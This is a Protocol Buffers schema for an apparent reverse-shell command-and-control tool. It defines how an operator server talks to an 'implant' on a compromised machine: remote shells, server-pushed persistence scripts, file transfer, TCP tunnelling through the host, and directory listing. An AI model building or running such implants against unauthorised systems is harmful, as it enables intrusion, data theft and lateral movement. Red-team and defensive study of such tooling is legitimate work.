syntax = "proto3";

package mux;
option go_package = "github.com/nemanjan00/reverse-shell-listener/client/muxpb";

// Multiplexed reverse-shell protocol.
//
// One WebSocket connection = one "host" (a compromised machine running the Go
// client). Over that single connection many independent PTY-backed shell
// *channels* are multiplexed, each identified by a channel_id and surfaced in
// the dashboard as its own session.
//
// Each binary WebSocket message carries exactly one serialized Frame. Channels
// are opened by the server (operator clicks "new shell"); the client answers
// with OpenOk/OpenError, then raw PTY bytes flow both ways as Data frames.
//
// Directions:
//   client -> server : Hello, OpenOk, OpenError, Data, Close, Pong, Ping, AutoExecResult, FileStart, FileChunk, FileDone, ProxyOpen, ProxyData, ProxyClose
//   server -> client : OpenRequest, Data, Resize, Close, Ping, Pong, AutoExec, FileRequest, FileStart, FileChunk, FileDone, ProxyOpen, ProxyData, ProxyClose
//   File* frames are relayed between the dashboard and the client via the server.
//   Proxy* frames tunnel arbitrary TCP connections through a mux host.

message Frame {
  oneof kind {
    Hello       hello        = 1;  // client -> server, first frame after connect
    OpenRequest open_request = 2;  // server -> client: please open a channel
    OpenOk      open_ok      = 3;  // client -> server: channel is up
    OpenError   open_error   = 4;  // client -> server: could not open channel
    Data        data         = 5;  // both: raw PTY bytes for a channel
    Resize      resize       = 6;  // server -> client: new terminal size
    Close       close        = 7;  // both: a channel ended / please end it
    Ping        ping         = 8;  // both: keepalive
    Pong        pong         = 9;  // both: keepalive reply
    AutoExec    auto_exec    = 10; // server -> client: run this script locally
    FileRequest file_request = 11; // downloader -> uploader: request a file
    FileStart   file_start   = 12; // uploader  -> downloader: begin transfer
    FileChunk   file_chunk   = 13; // uploader  -> downloader: data chunk
    FileDone    file_done    = 14; // either    -> either:    end or error
    ProxyOpen      proxy_open      = 15; // server -> client: open a TCP tunnel
    ProxyOpenOk    proxy_open_ok   = 18; // client -> server: tunnel is open
    ProxyOpenError proxy_open_error = 19; // client -> server: tunnel open failed
    ProxyData      proxy_data       = 16; // both: raw tunnel bytes
    ProxyClose     proxy_close      = 17; // both: tunnel ended
    FsList         fs_list          = 20; // server -> client: list directory
    FsListResult   fs_list_result   = 21; // client -> server: directory listing
    FsStat         fs_stat          = 22; // server -> client: stat path
    FsStatResult   fs_stat_result   = 23; // client -> server: stat result
  }
}

// Sent once, immediately after the socket opens, so the operator sees who
// called home. The token field authenticates the client against the server's
// BUILD_TOKEN (the same token used by the /dl download endpoint); a missing
// or mismatched token causes the server to close the connection.
message Hello {
  string hostname = 1;
  string username = 2;
  string os       = 3;  // runtime.GOOS
  string arch     = 4;  // runtime.GOARCH
  uint32 version  = 5;  // protocol version (see PROTO_VERSION)
  string tags     = 6;  // free-form label the operator can set on the implant
  string token    = 7;  // BUILD_TOKEN; server rejects the connection if it mismatches
}

// Server asks the client to spawn a new shell channel.
message OpenRequest {
  uint32 channel_id = 1;  // server-assigned, unique per host connection
  string command    = 2;  // shell/command to exec; empty => default shell
  uint32 cols       = 3;  // initial terminal width
  uint32 rows       = 4;  // initial terminal height
}

message OpenOk {
  uint32 channel_id = 1;
  uint32 pid        = 2;  // pid of the spawned shell (informational)
}

message OpenError {
  uint32 channel_id = 1;
  string message    = 2;
}

// Raw PTY bytes for one channel, in either direction.
message Data {
  uint32 channel_id = 1;
  bytes  data       = 2;
}

// Server -> client: apply a new window size to the channel's PTY (SIGWINCH).
message Resize {
  uint32 channel_id = 1;
  uint32 cols       = 2;
  uint32 rows       = 3;
}

// Either side closing a channel. reason is best-effort/human-readable.
message Close {
  uint32 channel_id = 1;
  string reason     = 2;
  int32  exit_code  = 3;  // client -> server: shell exit code, -1 if unknown
}

message Ping { uint64 nonce = 1; }
message Pong { uint64 nonce = 1; }

// Server -> client: a script the client should execute locally right after
// Hello. The server picks the file based on the client's reported os: it
// reads autoexec/<os>.sh (or autoexec/<os>.ps1 for windows) from the autoexec
// directory and sends the contents here. Used for persistence / setup without
// hardcoding commands in the implant binary.
message AutoExec {
  string os      = 1;  // the os the server matched on (informational)
  string shell   = 2;  // "sh" or "powershell" — how to invoke the script
  bytes  script  = 3;  // the script body to execute
}

// Downloader asks the uploader to send a file.
message FileRequest {
  uint32 transfer_id = 1;  // chosen by the downloader, unique per host connection
  string path        = 2;  // path of the file on the uploader's side
}

// Uploader begins a file transfer in response to FileRequest (download) or as
// the first frame of an upload.
message FileStart {
  uint32 transfer_id = 1;
  string path        = 2;
  uint64 size        = 3;  // total bytes, 0 if unknown
}

// Raw file data chunk.
message FileChunk {
  uint32 transfer_id = 1;
  bytes  data        = 2;
}

// Signals the end of a transfer. error is empty on success.
message FileDone {
  uint32 transfer_id = 1;
  string error       = 2;
}

// Server asks the client to open a TCP connection for a proxy tunnel.
message ProxyOpen {
  uint32 proxy_id = 1;  // server-assigned, unique per host connection
  string host     = 2;  // target hostname or IP
  uint32 port     = 3;  // target port
}

// Client reports that the proxy tunnel was successfully opened.
message ProxyOpenOk {
  uint32 proxy_id = 1;
}

// Client reports that the proxy tunnel could not be opened.
message ProxyOpenError {
  uint32 proxy_id = 1;
  string message  = 2;
}

// Raw bytes for one proxy tunnel, in either direction.
message ProxyData {
  uint32 proxy_id = 1;
  bytes  data     = 2;
}

// Either side closing a proxy tunnel. reason is best-effort/human-readable.
message ProxyClose {
  uint32 proxy_id = 1;
  string reason   = 2;
}

// Server asks the client to list a directory's contents.
message FsList {
  uint32 request_id = 1;
  string path       = 2;
}

// One entry in a directory listing.
message FsEntry {
  string name     = 1;
  bool   is_dir   = 2;
  uint64 size     = 3;
  int64  mod_time = 4;  // Unix milliseconds
}

// Client returns the result of FsList.
message FsListResult {
  uint32    request_id = 1;
  string    error      = 2;  // empty on success
  repeated  FsEntry entries = 3;
}

// Server asks the client to stat a path.
message FsStat {
  uint32 request_id = 1;
  string path       = 2;
}

// Client returns the result of FsStat.
message FsStatResult {
  uint32 request_id = 1;
  string error      = 2;  // empty on success
  bool   exists     = 3;
  bool   is_dir     = 4;
  uint64 size       = 5;
  int64  mod_time   = 6;  // Unix milliseconds
}
